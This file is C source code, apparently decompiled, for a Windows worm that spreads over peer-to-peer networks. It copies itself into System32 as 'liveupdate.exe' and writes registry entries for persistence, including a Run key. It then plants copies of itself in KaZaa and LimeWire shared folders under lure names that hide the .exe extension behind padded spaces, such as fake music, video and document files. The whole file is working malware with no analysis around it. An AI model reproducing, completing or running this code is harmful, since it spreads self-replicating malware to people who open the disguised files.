#pragma optimize("", off)
#include "data_globals.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Alias local variables
    volatile int iVar1_buf[2] = {{0, (int)0}};
    volatile int *p_iVar1 = (volatile int *)&iVar1_buf[0];

    volatile HKEY local_11c_buf[2] = {{0, (HKEY)0}};
    volatile HKEY *p_local_11c = (volatile HKEY *)&local_11c_buf[0];

    CHAR local_118[260];  // array, keep as is

    volatile DWORD local_14_buf[2] = {{0, (DWORD)0}};
    volatile DWORD *p_local_14 = (volatile DWORD *)&local_14_buf[0];

    volatile HMODULE local_10_buf[2] = {{0, (HMODULE)0}};
    volatile HMODULE *p_local_10 = (volatile HMODULE *)&local_10_buf[0];

    char wormpath[MAX_PATH];    // array, keep as is

    GetWindowsDirectoryA(_windir, MAX_PATH);
    (*p_local_10) = GetModuleHandleA(NULL);
    (*p_local_14) = GetModuleFileNameA((*p_local_10), wormpath, MAX_PATH);

    // Build "C:\Windows\System32\liveupdate.exe" in _windir
    strcat(_windir, "\\System32\\liveupdate.exe");

    CopyFileA(wormpath, _windir, 0);

    RegCreateKeyA((HKEY)0x80000000, "CLSID\\{7A9D77BD-5403-11d2-8785-2E0420524153}", (HKEY*)p_local_11c);
    RegSetValueExA((*p_local_11c), "Branko", 0, REG_SZ, (const BYTE*)_windir, strlen(_windir)+1);

    RegCreateKeyA((HKEY)0x80000001, "Software\\Microsoft\\Internet Explorer\\InternetRegistry", (HKEY*)p_local_11c);
    RegSetValueExA((*p_local_11c), "Branko", 0, REG_SZ, (const BYTE*)_windir, strlen(_windir)+1);

    RegCreateKeyA((HKEY)0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\Remote", (HKEY*)p_local_11c);
    RegSetValueExA((*p_local_11c), "Explorer", 0, REG_SZ, (const BYTE*)_windir, strlen(_windir)+1);

    RegCreateKeyA((HKEY)0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", (HKEY*)p_local_11c);
    RegSetValueExA((*p_local_11c), "Branko", 0, REG_SZ, (const BYTE*)_windir, strlen(_windir)+1);

    RegCreateKeyA((HKEY)0x80000001, "Software\\Kazaa\\Transfer", (HKEY*)p_local_11c);
    RegSetValueExA((*p_local_11c), "Upload", 0, REG_SZ, (const BYTE*)_windir, strlen(_windir)+1);

    // Missing registry key (original lines 62‑63)
    RegCreateKeyA((HKEY)0x80000001, "Software\\Microsoft\\Protected Storage System Provider\\S-1-5-21-1004336348-484061587-1177238915-500\\NoAction", (HKEY*)p_local_11c);
    RegSetValueExA((*p_local_11c), "Branko", 0, REG_SZ, (const BYTE*)_windir, strlen(_windir)+1);

    RegCreateKeyA((HKEY)0x80000002, "Software\\Microsoft\\Windows Live\\Communications Clients\\Share", (HKEY*)p_local_11c);
    RegSetValueExA((*p_local_11c), "Send", 0, REG_SZ, (const BYTE*)_windir, strlen(_windir)+1);

    // P2P copies
    CopyFileA(wormpath, "C:\\Program Files\\KaZaa\\gratis.mp3.exe", 0);
    CopyFileA(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\ladygaga.mp3                    .exe", 0);
    CopyFileA(wormpath, "C:\\Program Files\\KaZaa\\maliciousremovaltool.exe", 0);
    CopyFileA(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\ladyinbed.avi                    .exe", 0);
    CopyFileA(wormpath, "C:\\Program Files\\KaZaa\\ReadMe!.nfo                    .exe", 0);
    CopyFileA(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\list-download.txt                    .exe", 0);
    CopyFileA(wormpath, "C:\\Program Files\\KaZaa\\game-collection.exe", 0);
    CopyFileA(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\porno+18.mpeg                    .exe", 0);
    CopyFileA(wormpath, "C:\\Program Files\\KaZaa\\remoteotherkazaa.exe", 0);
    CopyFileA(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\softpacked.exe", 0);
    CopyFileA(wormpath, "C:\\Program Files\\LimeWire\\gratis.zip.exe", 0);
    CopyFileA(wormpath, "C:\\Program Files\\LimeWire\\My Shared Folder\\spaceticket.doc                    .exe", 0);
    CopyFileA(wormpath, "C:\\WINDOWS\\system32\\inetsrv.dll                    .exe", 0);

    return 0;
}
#pragma optimize("", on)
